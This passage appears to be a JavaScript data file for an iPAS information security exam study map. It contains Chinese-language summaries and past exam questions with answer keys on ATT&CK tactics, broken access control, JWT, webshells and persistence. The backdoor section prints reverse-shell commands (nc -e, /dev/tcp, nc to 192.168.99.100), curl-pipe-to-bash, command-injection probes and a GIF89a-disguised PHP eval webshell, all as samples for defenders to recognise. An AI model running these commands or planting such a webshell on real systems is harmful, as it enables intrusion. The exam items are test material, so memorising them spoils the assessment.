window.MAP_DATA = {
 "meta": {
  "pageTitle": "資安中級科目二星圖",
  "brandSmall": "iPAS 資訊安全工程師・中級・科目二 資訊安全防護實務",
  "brandBig": "資安防護星圖",
  "examDate": "",
  "examLabel": "",
  "storePrefix": "sec22map",
  "hotMin": 10,
  "sourceNote": "依據：115 年度資訊安全工程師能力鑑定簡章（評鑑主題與內容）＋ 108～115 年 12 次科目二公告試題（每卷 40 題）；圈圈大小＝12 次考了幾題",
  "chapters": [
   {
    "id": "1",
    "name": "弱點、攻擊與防護實務",
    "short": "1 弱點、攻擊與防護",
    "color": "#f58a8a"
   },
   {
    "id": "2",
    "name": "作業安全實務",
    "short": "2 作業安全實務",
    "color": "#b99af7"
   }
  ],
  "anchors": {
   "1.1": [
    380,
    300
   ],
   "1.2": [
    1100,
    340
   ],
   "2.1": [
    450,
    900
   ],
   "2.2": [
    1200,
    900
   ]
  }
 },
 "chapters": {
  "1": "弱點、攻擊與防護實務",
  "2": "作業安全實務"
 },
 "sections": [
  {
   "chapter": "1",
   "id": "1.1",
   "name": "弱點、威脅分類與攻擊手法"
  },
  {
   "chapter": "1",
   "id": "1.2",
   "name": "防護與應變實務"
  },
  {
   "chapter": "2",
   "id": "2.1",
   "name": "安全維運"
  },
  {
   "chapter": "2",
   "id": "2.2",
   "name": "滲透測試、源碼測試、資安健診"
  }
 ],
 "topics": [
  {
   "id": "1.1-01",
   "section": "1.1",
   "title": "ATT&CK 與攻擊鏈對應",
   "examHits": 14,
   "examRefs": [
    "115-2 第1題",
    "115-1 第2題",
    "115-1 第12題",
    "114-2 第5題",
    "114-2 第26題",
    "113-2 第18題",
    "113-1 第1題",
    "112-2 第1題",
    "112-2 第6題",
    "112-2 第10題",
    "112-2 第12題",
    "112-2 第14題",
    "112-1 第13題",
    "112-1 第14題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "資安事件分析時，先要把「看到的行為」對到 ATT&CK 的戰術（攻擊者想達成什麼目標）與技術（用什麼手法達成）。例如看到列檔案、列帳號、掃網段，是 Discovery（探索）；轉儲 LSASS、抓 Hash，是 Credential Access（憑證存取）；利用對外服務的漏洞取得 shell，是 Initial Access（初始存取）；寄信給內部同事再釣魚，是 Lateral Movement（橫向移動）。考試常問「這個動作屬於哪個戰術或技術編號」，以及 ATT&CK 對 SOC 的價值：它是依真實觀察整理的 TTPs 知識庫，用來理解攻擊者行為模式，不是黑名單，也不是自動歸因或自動偵測工具。",
   "keyPoints": [
    "看到「指令只是在列舉檔案、帳號、網段」→ 先想 Discovery（如 T1083 檔案與目錄探索），外洩要看到另外的傳輸動作才算 Exfiltration。",
    "看到「對外服務有漏洞，插入語法取得遠端指令與 shell」→ 歸 Initial Access（利用對外應用程式漏洞），之後才輪到內網掃描與橫向移動。",
    "看到「轉儲 LSASS、OS Credential Dumping」→ Credential Access；清除事件記錄、停用防護 → Defense Evasion；兩者別混。",
    "問 ATT&CK 對 SOC 的價值 → 答「真實世界觀察的 TTPs 知識庫，幫助理解行為模式與規劃偵測」，凡是說「絕對歸因」「唯一情資來源」「取代分析師」都是錯的。",
    "同一種手法可能同時出現在多個戰術（如 UAC 繞過屬權限提升），要用選項的關鍵動詞判斷，不要只憑工具名。"
   ],
   "trap": "把「只列舉檔案」的指令直接當成外洩，或把 ATT&CK 當成 IP／網域黑名單、自動歸因工具；戰術（目標）與技術（手法）也常被混為一談。",
   "quiz": [
    {
     "stem": "下列何者最符合MITRE ATT&CK的橫向移動（Lateral Movement）技術？",
     "options": [
      "利用內部魚叉式網路釣魚獲得存取權",
      "繞過使用者帳戶控制（User Account Control, UAC）",
      "通過可卸除式磁碟進行通信",
      "使用LLMNR/NBT-NS 下毒（Poisoning）及SMB 中繼（Relay）"
     ],
     "answer": 0,
     "hint": "先回想 ATT&CK 對「橫向移動」戰術的定義，再逐項問：這個動作的目的屬於哪一個戰術？",
     "explanation": "答案 A。ATT&CK 的橫向移動戰術包含「內部魚叉式釣魚（Internal Spearphishing）」：攻擊者已在內網，用被控帳號寄信給其他同仁取得更多存取權。B 繞過 UAC 是為了提權，屬權限提升／防禦規避；C 透過可卸除式媒體通信屬於指揮與控制（C2）方向的手法；D LLMNR/NBT-NS 下毒與 SMB 中繼是攔截並重放認證，通常歸在憑證存取（Credential Access）。",
     "source": "115-2 第1題"
    },
    {
     "stem": "下列何項屬於MITRE ATT&CK 中的憑證存取（Credential Access）戰術（Tactic）？",
     "options": [
      "從本機系統蒐集資料（Data from Local System）",
      "外部遠端服務使用（External Remote Services）",
      "清除 Windows 事件記錄（Clear Windows Event Logs）",
      "作業系統憑證傾印（OS Credential Dumping）"
     ],
     "answer": 3,
     "hint": "回想 ATT&CK 各戰術代表的攻擊者目的，逐項問：這個技術是為了達成哪一個戰術？",
     "explanation": "答案 D。作業系統憑證傾印（OS Credential Dumping）是 Credential Access 的典型技術，例如從 LSASS 記憶體取出 Hash 與密碼。A 從本機系統蒐集資料屬 Collection（蒐集）；B 外部遠端服務使用是以 VPN、RDP 等入口進入，屬 Initial Access／Persistence；C 清除 Windows 事件記錄是抹除跡證，屬 Defense Evasion。",
     "source": "115-1 第2題"
    },
    {
     "stem": "依 MITRE ATT&CK，若攻擊者執行 PowerShell 指令 Get-ChildItem -Recurse 快速列舉檔案，並進一步將結果外洩（exfiltrate），此行為最符合下列何項技術（technique）？",
     "options": [
      "T1005 Data from Local System",
      "T1083 File and Directory Discovery",
      "T1041 Exfiltration Over Command & Control Channel",
      "T1070 Indicator Removal"
     ],
     "answer": 1,
     "hint": "逐項問：這個技術編號描述的行為，與 Get-ChildItem -Recurse 這條指令本身做的事是否相同？",
     "explanation": "答案 B。Get-ChildItem -Recurse 是遞迴列出檔案與目錄，行為本身就是檔案與目錄探索（T1083 File and Directory Discovery）。A T1005 是真的把本機資料蒐集起來；C T1041 要看到經由 C2 通道傳出資料的動作；D T1070 是刪除或竄改跡證。題幹雖提到後續外洩，但被問的是這條指令本身，所以答探索，外洩是之後另一個技術。",
     "source": "115-1 第12題"
    },
    {
     "stem": "情境如附圖所示。「在系統插入惡意 OGNL 語法，成功遠端執行任意指令並取得 Shell 權限」這一攻擊行為，根據 MITRE ATT&CK，最適合歸類於下列哪一個戰術？",
     "options": [
      "Reconnaissance（偵察）",
      "Initial Access（初始存取）",
      "Privilege Escalation（權限提升）",
      "Defense Evasion（防禦規避）"
     ],
     "answer": 1,
     "context": "某醫療資訊系統採用 Apache Struts 2 作為開發框架，且版本未及時更新。該醫院在做紅隊演練時，施測人員發現可透過特定 HTTP 請求，於 HTTP Header 中對醫療資訊系統插入惡意 OGNL（Object Graph Navigation Language）語法，成功在系統上遠端執行任意指令（RCE），取得 Shell 權限。施測人員進一步利用此權限，在內網大量掃描，並且進行橫向移動（Lateral Movement），最終施測人員找到資料庫的伺服器，並且以預設帳號密碼登入，竊取大量病患的醫療資料，若這個漏洞被攻擊者利用，將會造成嚴重的機密資料外洩事件。",
     "hint": "先確認這個動作發生在攻擊鏈的哪一刻：進入之前、進入的當下，還是進入之後。",
     "explanation": "答案 B。利用 Struts 2 的 OGNL 注入，從對外的 HTTP 請求取得遠端指令執行與 shell，屬於『第一次進入目標環境』，歸 Initial Access（利用對外應用程式的漏洞）。A Reconnaissance 是事前偵察；C 權限提升是取得 shell 之後想拿更高權限；D 防禦規避是隱藏行為。後面的內網掃描與橫向移動才是題幹接下來的戰術。",
     "source": "114-2 第5題"
    },
    {
     "stem": "情境如附圖所示。鑑於近期持續不斷的 APT 攻擊，資安營運中心（Security Operations Center, SOC）在利用網路威脅情資（Cyber Threat Intelligence, CTI）時，對於採用 MITRE ATT&CK 這類框架的主要價值，下列描述何者最為正確？",
     "options": [
      "MITRE ATT&CK 提供詳盡的特定攻擊者 IP 位址和網域名稱列表，便於 SOC 立即封鎖，是唯一實用的情資來源",
      "MITRE ATT&CK 能夠自動且絕對地將攻擊歸因於特定國家級行為者，簡化歸因過程，減少分析師工作量",
      "MITRE ATT&CK 的主要目的是為 SOC 提供自動化的威脅偵測工具，取代人工分析師的判斷，達到全面自動化",
      "MITRE ATT&CK 提供一套基於真實世界觀察的威脅者戰術、技術與程序（TTPs）知識庫，有助於 SOC 理解威脅者行為模式"
     ],
     "answer": 3,
     "context": "近年來，全球網路資安情勢日趨嚴峻，伴隨地緣政治緊張，複雜且高強度的國家級網路攻擊，例如：進階持續性威脅（Advanced Persistent Threat, APT）日益頻繁。這些攻擊不僅針對傳統資訊技術（Information Technology, IT）環境，更擴展至關鍵基礎設施的營運技術（Operational Technology, OT）系統、企業雲端服務與員工行動裝置。攻擊手法融合了勒索軟體、供應鏈攻擊等多種戰術，目的從情資竊取到癱瘓業務不等，對組織的資料完整性、可用性與機密性構成前所未有的挑戰。",
     "hint": "逐項對照 MITRE 對 ATT&CK 的官方定位（它收錄什麼、用來做什麼），判斷每句描述是否相符。",
     "explanation": "答案 D。ATT&CK 是依真實世界觀察整理的威脅者戰術、技術與程序（TTPs）知識庫，SOC 用它理解行為模式、盤點偵測缺口。A 它不是 IP／網域清單，也不是唯一情資來源；B 它不能自動、絕對地歸因到某國家；C 它是知識框架，不是取代分析師的自動化偵測工具。",
     "source": "114-2 第26題"
    }
   ]
  },
  {
   "id": "1.1-02",
   "section": "1.1",
   "title": "存取控制、JWT 與 OWASP 風險",
   "examHits": 11,
   "examRefs": [
    "115-2 第3題",
    "115-1 第33題",
    "115-1 第34題",
    "115-1 第35題",
    "115-1 第36題",
    "114-2 第40題",
    "114-1 第39題",
    "113-2 第34題",
    "112-2 第9題",
    "112-1 第4題",
    "108-1 第12題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "Web／API 測試常見的情境是：一般使用者登入後，把網址或請求裡的參數（如 orderId）改成別人的值，竟然就看到別人的資料。這是 Broken Access Control（OWASP Top 10 的首位類別），屬於「物件層級授權」缺失（常稱 IDOR／BOLA）。根因是伺服器沒有檢查「這個登入者是否有權存取這個物件」，所以正解在伺服器端做授權檢查，而不是靠前端、多因子驗證或單純限速。JWT 常見重點：Authorization: Bearer 後面由三段 Base64URL 組成（Header、Payload、簽章），Header 裡的 alg 說明簽章演算法，alg 為 none 代表不簽章，是危險設定。",
   "keyPoints": [
    "看到「改參數就能看別人資料」→ Broken Access Control（物件層級授權缺失），修補在伺服器端對每次請求驗證使用者與資源的關係。",
    "看到「前端檢查授權」→ 不可信，前端可被繞過；雙因子驗證只保護登入，不處理已登入後的越權。",
    "看到 JWT 三段以 . 分隔 → Header、Payload 是 Base64URL 編碼（可解碼讀取，不是加密）；Header 的 alg 決定簽章驗證方式。",
    "看到 alg: none → 代表不使用簽章，不等於「預設採用最高層級驗證」，驗證端必須拒絕。",
    "評估影響範圍 → 想資料外洩的後果（個資法規、詐騙）與相同開發習慣的其他功能，但不會自動變成 SQL 注入式的全庫結構外洩。"
   ],
   "trap": "以為「加密、加雜湊、加 MFA 或加限速」就能補好越權存取；這類弱點的根因是伺服器端缺少授權檢查。",
   "quiz": [
    {
     "stem": "某購物平台在進行系統架構優化時，發現會員查詢模組存在嚴重的「非授權資料存取」弱點，經分析是由於開發人員未在伺服器端對請求參數中的識別碼進行權限驗證所致。資安團隊在規劃該弱點的修補與風險緩解策略時，考量到系統的高可用性與長期維護成本，下列哪一項策略在資安防護與架構整合上屬於最適切的規劃？",
     "options": [
      "採用基於物件的存取控制機制，在應用程式伺服器端實施身分驗證後的物件級授權，驗證當前使用者是否具備該識別碼之存取權限",
      "建立一套自動化的弱點偵測系統，針對該模組進行週期性的滲透測試，一旦偵測到可存取的異常ID，即透過系統自動封鎖該使用者的連線來源 IP",
      "在應用程式層部署Web應用程式防火牆（WAF），並將此類識別碼漏洞列入規則庫進行攔截，以在不更動原始程式碼的情況下快速緩解風險",
      "實施基於強制存取控制（MAC）的架構，將所有會員的存取請求強制進行安全標籤對應，並要求所有舊有模組必須重新設計以符合安全層級規範"
     ],
     "answer": 0,
     "hint": "先確認弱點的根因，再逐項問：這個策略能不能消除該根因？它的成本與對架構的衝擊符合題目條件嗎？",
     "explanation": "答案 A。根因是伺服器沒有驗證『當前使用者是否有權存取該識別碼的物件』，最適切的規劃是在應用程式伺服器端做物件層級授權。B 自動化偵測加封鎖 IP 是事後偵測與遏止，不修根因，也容易誤殺；C WAF 看不懂「這個 ID 屬於誰」的業務授權邏輯，只能當暫時緩解；D 強制存取控制（MAC）加全面重寫舊模組，成本與架構衝擊過大，與題目要求的長期維護成本不符。",
     "source": "115-2 第3題"
    },
    {
     "stem": "情境如附圖所示。若測試人員將 orderId 改為其他數值後成功取得不同使用者訂單資料，此弱點最適合歸類為下列何種弱點類別？",
     "options": [
      "Security Misconfiguration（不安全的組態設定）",
      "Insecure Deserialization（不安全的反序列化）",
      "Broken Access Control（無效的訪問控制）",
      "Security Logging & Alerting Failures（安全日誌及警報失效）"
     ],
     "answer": 2,
     "context": "某企業進行 Web 應用程式滲透測試，測試人員以一般使用者帳號登入後，發現可透過修改 API 參數存取其他使用者的訂單資料。以下為測試時攔截到的部分請求內容：\n\nGET /api/order/detail?orderId=10025 HTTP/1.1\nHost: securityshop.csf.org.tw\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyMDI1MTIzMCIsIm5hbWUiOiJpUEFTIFNlY3VyaXR5IEVuZ2luZWVyIiwiYWRtaW4iOnRydWUsImlhdCI6MzE0MTU5MjY1M30.YPEZ_8lwWcOyTdsZFnSu7dTKA0xsz-p1U5zRN3yRfQQ",
     "hint": "先看這次攻擊『攻擊者做了什麼動作、突破了哪種限制』，再對照各類別的名稱含義。",
     "explanation": "答案 C。只改 orderId 就取得他人訂單，是 Broken Access Control（無效的訪問控制），OWASP Top 10 的 A01。A 不安全的組態設定是預設值、多餘功能等；B 不安全的反序列化是物件反序列化造成執行或竄改；D 安全日誌及警報失效是沒有記錄與告警。本題的特徵是『已登入者越過權限看別人資料』。",
     "source": "115-1 第33題"
    },
    {
     "stem": "情境如附圖所示。承上題，下列何者較可解決此一問題？",
     "options": [
      "登入後還必須加上雙因子驗證才能防範",
      "API 應該加上次數限制",
      "在網頁前端進行授權檢查即可解決",
      "將相關參數雜湊加鹽隱碼處理"
     ],
     "answer": 3,
     "context": "某企業進行 Web 應用程式滲透測試，測試人員以一般使用者帳號登入後，發現可透過修改 API 參數存取其他使用者的訂單資料。以下為測試時攔截到的部分請求內容：\n\nGET /api/order/detail?orderId=10025 HTTP/1.1\nHost: securityshop.csf.org.tw\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyMDI1MTIzMCIsIm5hbWUiOiJpUEFTIFNlY3VyaXR5IEVuZ2luZWVyIiwiYWRtaW4iOnRydWUsImlhdCI6MzE0MTU5MjY1M30.YPEZ_8lwWcOyTdsZFnSu7dTKA0xsz-p1U5zRN3yRfQQ",
     "hint": "先確認弱點的根因，再逐項問：這個做法能不能讓改了 orderId 的請求拿不到別人的資料？",
     "explanation": "答案 D。官方採 D（將相關參數雜湊加鹽隱碼處理）。需要說明的是：一般認為根本解法是伺服器端的物件層級授權檢查，D 的做法是讓識別碼不易被猜到，屬輔助而非根治，官方未說明理由。其他選項為何較差：A 雙因子驗證保護的是登入，這裡已經是合法登入後的越權；B 次數限制只能減緩枚舉，不能阻止存取別人資料；C 前端授權檢查可被攻擊者直接改請求繞過。",
     "source": "115-1 第34題"
    },
    {
     "stem": "情境如附圖所示。下列何項「不」是這個漏洞可能造成的影響？",
     "options": [
      "企業可能會被使用者控告違反 GDPR（General Data Protection Regulation）",
      "如果企業的開發習慣不佳，其他功能可能也會有類似的漏洞，需要全盤檢視類似功能的設計方式",
      "攻擊者可以用這個漏洞直接列出資料庫的所有欄位，導致資料庫結構全部外洩",
      "使用者可能會因為這些資料外洩而接到詐騙電話"
     ],
     "answer": 2,
     "context": "某企業進行 Web 應用程式滲透測試，測試人員以一般使用者帳號登入後，發現可透過修改 API 參數存取其他使用者的訂單資料。以下為測試時攔截到的部分請求內容：\n\nGET /api/order/detail?orderId=10025 HTTP/1.1\nHost: securityshop.csf.org.tw\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyMDI1MTIzMCIsIm5hbWUiOiJpUEFTIFNlY3VyaXR5IEVuZ2luZWVyIiwiYWRtaW4iOnRydWUsImlhdCI6MzE0MTU5MjY1M30.YPEZ_8lwWcOyTdsZFnSu7dTKA0xsz-p1U5zRN3yRfQQ",
     "hint": "題目問『不是』影響：逐項判斷它是不是『只改參數讀到別人資料』會直接導致的結果。",
     "explanation": "答案 C。這個弱點的影響是未授權讀取他人資料，可能造成個資外洩（含法遵風險）、使用者接獲詐騙，也代表同類功能可能有相同設計缺陷。C 說可以列出資料庫所有欄位、使資料庫結構全部外洩，那是 SQL 注入等問題才會有的影響，單純改 orderId 取得訂單並不會直接洩露資料庫結構，所以不是這個漏洞的影響。A、B、D 都是合理的衝擊。",
     "source": "115-1 第35題"
    },
    {
     "stem": "情境如附圖所示。關於測試人員在 HTTP Header 中看到的 Authorization內容，下列哪些描述是正確的？",
     "options": [
      "會使用 HS256（HMAC with SHA-256）來驗證 token內容",
      "會使用 Base64 進行編碼",
      "會使用 RS256（RSA with SHA-256）來驗證 token內容",
      "如果使用 alg: none 代表不指定演算法，預設採用最高層級的驗證方式"
     ],
     "answer": [
      0,
      1,
      2
     ],
     "context": "某企業進行 Web 應用程式滲透測試，測試人員以一般使用者帳號登入後，發現可透過修改 API 參數存取其他使用者的訂單資料。以下為測試時攔截到的部分請求內容：\n\nGET /api/order/detail?orderId=10025 HTTP/1.1\nHost: securityshop.csf.org.tw\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyMDI1MTIzMCIsIm5hbWUiOiJpUEFTIFNlY3VyaXR5IEVuZ2luZWVyIiwiYWRtaW4iOnRydWUsImlhdCI6MzE0MTU5MjY1M30.YPEZ_8lwWcOyTdsZFnSu7dTKA0xsz-p1U5zRN3yRfQQ",
     "hint": "不用先猜答案：先把 Token 的第一段拆出來，看它寫了什麼，再逐項核對各個說法與它是否一致。",
     "explanation": "答案 A、B、C。官方採 A、B、C 為正確。需要說明的是：Header 解碼為 {\"alg\":\"HS256\",\"typ\":\"JWT\"}，所以 A（使用 HS256 驗證）正確；JWT 各段是 Base64URL 編碼，B 正確；但 C（RS256）與實際 Header 的 HS256 不符，一般認為此項不正確，官方未說明理由，列為爭議題。另一個佐證：第三段簽章解碼後是 32 位元組，正是 HMAC-SHA256 的長度；RS256 簽章長度會與 RSA 金鑰同長（例如 2048 位元＝256 位元組）。D 錯誤：alg 為 none 代表不簽章（不驗證完整性），並非預設最高層級驗證，是常見的攻擊面。",
     "source": "115-1 第36題"
    }
   ]
  },
  {
   "id": "1.1-03",
   "section": "1.1",
   "title": "後門、Webshell 與 C2 判讀",
   "examHits": 11,
   "examRefs": [
    "115-2 第30題",
    "114-2 第34題",
    "114-2 第35題",
    "114-2 第36題",
    "114-1 第33題",
    "114-1 第34題",
    "111-1 第5題",
    "109-1 第22題",
    "109-1 第39題",
    "108-1 第1題",
    "108-1 第33題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "調查可疑日誌或檔案時，要能從文字特徵認出後門類型。反彈 shell（Reverse Shell）是讓被害主機主動連回攻擊者，常見寫法如 nc ... -e /bin/sh、bash -i >& /dev/tcp/IP/PORT 0>&1、用 mknod 建 pipe 再接 telnet；而 curl ... | bash 只是下載並執行遠端腳本，不算反彈 shell。Web 端的一句話木馬（Webshell）像 <?php @eval($_REQUEST[\"input\"]);?>，檔案開頭加 GIF89a 是偽裝成圖片，騙過上傳檔案類型檢查。命令注入常用 ; sleep 5 測試是否真的執行、whoami 看身分、find / -perm -u=s 找 setuid 檔案準備提權。",
   "keyPoints": [
    "看到 nc -e、bash -i >& /dev/tcp/…、mknod 管道加 telnet → 反彈 shell；看到 curl … | bash → 下載並執行腳本，不是反彈。",
    "看到 ; sleep 5 → 用延遲確認注入是否執行；; whoami → 確認目前執行身分（Web 服務常是 www-data）。",
    "看到 find / -perm -u=s -type f → 找 setuid 檔案（以檔案擁有者權限執行）準備提權；它不找 setgid、sticky bit 或 root 擁有者的檔案。",
    "看到檔案開頭 GIF89a 加 PHP 程式碼 → 偽裝成圖片的 Webshell，常用來繞過上傳檢查；它不是真的圖片內容。",
    "看到 eval($_REQUEST[…]) → 一句話木馬，攻擊者傳入什麼就執行什麼。"
   ],
   "trap": "把「檔頭是 GIF89a」當成真的圖片，或把「下載並執行腳本」誤認成反彈 shell；find -perm 的參數也常被混成 setgid 或 sticky bit。",
   "quiz": [
    {
     "stem": "在分析Linux主機上的可疑命令紀錄時，分析人員發現多筆疑似反彈shell 的指令。下列哪一項「不」是常見的shell 反彈指令？",
     "options": [
      "nc 10.0.0.1 1234 -e /bin/sh",
      "mknod a p; telnet 10.0.0.1 8080 0<a | /bin/bash 1>a",
      "curl -s http://10.0.0.1 | bash",
      "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
     ],
     "answer": 2,
     "hint": "反彈 shell 的核心是『被害端主動連出去，並把 shell 的輸入輸出綁到那條連線』，逐項看是否有這兩件事。",
     "explanation": "答案 C。反彈 shell 的特徵是讓被害主機主動建立連線並把 shell 交給攻擊者：A 用 nc -e 把 /bin/sh 綁到連線；B 用 mknod 建具名管道再用 telnet 轉接 bash；D 用 bash 的 /dev/tcp 把輸入輸出導向連線。C 的 curl -s … | bash 是下載遠端腳本直接執行，行為是『載入並執行』而非建立互動式反向連線，所以不是常見的反彈 shell 指令。",
     "source": "115-2 第30題"
    },
    {
     "stem": "情境如附圖所示。請問「127.0.0.1; whoami」可能是攻擊者想要用來評估下列何項資訊？（請選擇最合適的選項。）",
     "options": [
      "評估此作業系統版本是否有現成的漏洞可以利用",
      "評估該使用者是否有足夠的權限可以存取機敏資料",
      "評估該使用者的群組是否有足夠的權限可以存取機敏資料",
      "評估當下的系統路徑位於哪個目錄中"
     ],
     "answer": 1,
     "context": "你是一位企業的藍隊防禦專家，今天你忽然收到來自 SOC 的告警，顯示有某個伺服器正在發生異常行為，於是你開始對這個伺服器展開調查，評估是否有發生資安事件。\n你發現伺服器裡面有一個 ping 的功能，並且在該功能的網頁應用程式日誌裡面出現這種類型的內容：\n127.0.0.1; sleep 5\n127.0.0.1; whoami\n127.0.0.1; /bin/bash -i 2>&1 | nc 192.168.99.100 80 > /tmp/tmp.txt",
     "hint": "回想 whoami 指令的輸出內容，逐項問：攻擊者拿到這個輸出，能評估選項所說的資訊嗎？",
     "explanation": "答案 B。; whoami 是在命令注入成功後確認目前程序的執行身分，用來判斷帳號權限夠不夠碰機敏資料。官方採 B。A 評估作業系統版本漏洞要用 uname、系統資訊類指令；C 看群組權限通常用 id 之類的指令；D 看目前目錄是 pwd。需要說明的是，whoami 本身只回傳帳號名稱，B 與 C 的差異官方未進一步說明。",
     "source": "114-2 第34題"
    },
    {
     "stem": "情境如附圖所示。請問「127.0.0.1; /bin/bash -i 2>&1 | nc 192.168.99.100 80 > /tmp/tmp.txt」這個日誌的內容，可能代表下列何種攻擊情境？（請選擇最合適的選項。）",
     "options": [
      "攻擊者想要勘查 192.168.99.100 的 80 port 是否可進行連線，可以連線就可以讀取更多網頁內容",
      "攻擊者想要讀取 /bin/bash 這個檔案內容，並且把結果輸出到 /tmp/tmp.txt 裡面",
      "攻擊者想要透過 nc 進行反向連線，讓 192.168.99.100 這台電腦可以對伺服器輸入指令",
      "攻擊者想要讀取作業系統的版本資訊，並且尋找有無可利用的漏洞直接對作業系統進行攻擊"
     ],
     "answer": 2,
     "context": "你是一位企業的藍隊防禦專家，今天你忽然收到來自 SOC 的告警，顯示有某個伺服器正在發生異常行為，於是你開始對這個伺服器展開調查，評估是否有發生資安事件。\n你發現伺服器裡面有一個 ping 的功能，並且在該功能的網頁應用程式日誌裡面出現這種類型的內容：\n127.0.0.1; sleep 5\n127.0.0.1; whoami\n127.0.0.1; /bin/bash -i 2>&1 | nc 192.168.99.100 80 > /tmp/tmp.txt",
     "hint": "看管線兩端：誰的輸出被送到誰那裡？再對照選項描述的『資料流方向』。",
     "explanation": "答案 C。/bin/bash -i 2>&1 | nc 192.168.99.100 80 是把互動式 bash 的輸出透過 nc 傳到外部 192.168.99.100 的 80 埠，屬反向連線，讓對方可對伺服器下指令。官方採 C。A 不是在探測埠是否可連；B 並非讀取 /bin/bash 檔案內容，而是執行它；D 讀取作業系統版本是另外的指令。",
     "source": "114-2 第35題"
    },
    {
     "stem": "情境如附圖所示。你參考日誌內容，嘗試輸入一樣的參數內容「127.0.0.1; whoami」到網頁應用程式中，發現回傳結果是 www-data。同時，你也在作業系統的指令日誌裡面看到「find / -perm -u=s -type f 2>/dev/null」，請問攻擊者執行這個指令「最不可能」做下列哪些攻擊行為？（請選擇最合適的選項。）",
     "options": [
      "尋找有被設定 setuid 的檔案，後續可嘗試用該檔案來把當前身分提升成為 root 權限",
      "尋找有被設定 setgid 的檔案，後續可嘗試用該檔案來把當前身分提升成為 root 權限",
      "尋找有被設定 stickyBit 的目錄，後續可嘗試用該目錄裡面的檔案來提升成為 root 權限",
      "尋找有被設定為 root:root 的檔案與目錄，確認機敏資料在哪些地方"
     ],
     "answer": [
      1,
      2,
      3
     ],
     "context": "你是一位企業的藍隊防禦專家，今天你忽然收到來自 SOC 的告警，顯示有某個伺服器正在發生異常行為，於是你開始對這個伺服器展開調查，評估是否有發生資安事件。\n你發現伺服器裡面有一個 ping 的功能，並且在該功能的網頁應用程式日誌裡面出現這種類型的內容：\n127.0.0.1; sleep 5\n127.0.0.1; whoami\n127.0.0.1; /bin/bash -i 2>&1 | nc 192.168.99.100 80 > /tmp/tmp.txt",
     "hint": "把指令的篩選參數一個一個拆開讀：每個參數對應哪一種檔案權限屬性。",
     "explanation": "答案 B、C、D。find / -perm -u=s -type f 2>/dev/null 是從根目錄找設定了 setuid（-u=s）的一般檔案並隱藏錯誤訊息，用來找提權途徑，所以 A 是它可能的用途。題目問『最不可能』做的：B 找 setgid 要用 -g=s，不是本指令；C 找 sticky bit 要用 -perm -1000 且針對目錄，不是本指令；D 找 root:root 擁有者要用 -user／-group，本指令不是依擁有者篩選。",
     "source": "114-2 第36題"
    },
    {
     "stem": "情境如附圖所示。你登入那台被入侵的伺服器之後，在網頁目錄中發現一個沒看過的檔案 index2.php，檔案內容如附圖 1 所示。請問下列何項描述「錯誤」？",
     "options": [
      "GIF89a 是 GIF 圖片的檔頭（File Header）",
      "這是一張 GIF 圖片，如果在作業系統裡面點擊圖片檔案的話，圖片顯示的內容是「input」",
      "這個檔案可能被伺服器誤以為是一個圖檔，因此允許使用者上傳到目錄中，但其中包含一段 PHP 程式碼，可能會造成威脅",
      "這個檔案就是常見的一句話木馬，可以用來執行 PHP 程式碼，攻擊者通常會用來控制伺服器"
     ],
     "answer": 1,
     "context": "你是一位企業的藍隊防禦專家，目前你的企業正在進行紅隊演練，今天你忽然收到來自 EDR 的告警，顯示昨天某台伺服器已經被攻擊者取得控制權，於是你開始對這個檔案以及背後的紅隊攻擊行動展開調查。\n附圖 1\nGIF89a\n\n<?php @eval($_REQUEST[\"input\"]);exit;?>",
     "hint": "題目問『錯誤』：想想檔案開頭那串字元與後面的程式碼各自扮演什麼角色。",
     "explanation": "答案 B。這個檔案是 PHP 一句話木馬：檔頭 GIF89a 只是偽造的圖片檔頭，目的是騙過上傳時的檔案類型檢查，後面 <?php @eval($_REQUEST[\"input\"]);exit;?> 會執行攻擊者傳入的 input 參數。所以 B 說它是一張 GIF、點開會顯示 input，是錯誤的。A 檔頭描述正確；C 可能因誤判為圖片而被允許上傳，正確；D 就是常見一句話木馬，正確。",
     "source": "114-1 第33題"
    }
   ]
  },
  {
   "id": "1.1-04",
   "section": "1.1",
   "title": "Windows 端點濫用與持久化",
   "examHits": 10,
   "examRefs": [
    "114-1 第6題",
    "114-1 第9題",
    "114-1 第30題",
    "114-1 第36題",
    "113-1 第31題",
    "112-1 第40題",
    "111-1 第19題",
    "111-1 第28題",
    "110-1 第18題",
    "108-1 第24題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "入侵後，攻擊者要在 Windows 端點上落地、執行並長期留下。常見手法有：用內建工具（LOLBin）做事，例如 PowerShell 加 -ExecutionPolicy bypass 跑腳本；用排程工作命名成 windows update 偽裝；DLL Side Loading（把惡意 DLL 放在合法程式會優先搜尋的位置，利用 DLL 搜尋順序載入）；勒索軟體會用 vssadmin、wbadmin、fsutil 等指令刪除陰影複本、備份或日誌；Linux 端則用 crontab、~/.bashrc 寫入反彈指令達成持久化。考試問法是從指令、路徑、搜尋順序判斷攻擊者的動作與可驗證方式。",
   "keyPoints": [
    "看到 powershell -ExecutionPolicy bypass -command … → 略過執行政策執行腳本；腳本名偽裝成 svchost、排程名偽裝成 windows update 都是障眼法。",
    "看到 vssadmin、wbadmin、fsutil → 勒索軟體常拿來刪陰影複本、備份目錄、破壞檔案系統特性，是威脅獵捕的重點指令。",
    "看到 DLL 搜尋順序「應用程式目錄 → System32 → PATH」→ 惡意 DLL 要放在『順序在前、且攻擊者可寫入』的位置，才會被先載入。",
    "看到 ~/.bashrc 寫反彈指令、crontab 排程 → 持久化（登入或定時觸發）；known_hosts 是記錄伺服器公鑰，放登入金鑰要看 authorized_keys。",
    "DLL Side Loading 是 Windows 的 DLL 載入機制，利用合法軟體的載入行為隱藏惡意活動，不是只存在於 Linux。"
   ],
   "trap": "只看名稱就相信（windows update、svchost 看起來合法）；以及把 known_hosts 當成可放登入金鑰、把 nc 連本機當成後門。",
   "quiz": [
    {
